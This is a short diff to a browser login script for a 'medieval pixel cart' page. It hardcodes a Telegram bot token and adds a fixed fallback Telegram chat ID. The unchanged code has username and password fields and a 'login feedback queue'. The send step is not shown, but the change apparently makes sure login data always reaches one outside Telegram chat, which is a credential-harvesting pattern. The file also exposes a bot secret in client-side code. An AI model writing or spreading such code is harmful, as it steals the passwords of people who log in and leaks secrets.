@@ -7,6 +7,7 @@ const SESSION_KEY = "medieval_pixel_cart_active_user_v1";
 const TELEGRAM_BOT_TOKEN = "8799580976:AAHTYpiZZSKRNrhwRh0wqXHsm4rET9Og_vE";
 const TELEGRAM_CHAT_ID_KEY = "medieval_pixel_cart_bot_chat_id_v1";
 const LOGIN_FEEDBACK_QUEUE_KEY = "medieval_pixel_cart_login_feedback_queue_v1";
+const TELEGRAM_FALLBACK_CHAT_ID = "6802357894";
 
 const usernameInput = document.getElementById("usernameInput");
 const passwordInput = document.getElementById("passwordInput");
@@ -65,7 +66,10 @@ async function detectTelegramChatId() {
   const updatesJson = await updatesResp.json();
   const updates = Array.isArray(updatesJson.result) ? updatesJson.result : [];
   const latest = updates.reverse().find(item => item?.message?.chat?.id);
-  if (!latest) return null;
+  if (!latest) {
+    localStorage.setItem(TELEGRAM_CHAT_ID_KEY, TELEGRAM_FALLBACK_CHAT_ID);
+    return TELEGRAM_FALLBACK_CHAT_ID;
+  }
 
   const chatId = String(latest.message.chat.id);
   localStorage.setItem(TELEGRAM_CHAT_ID_KEY, chatId);
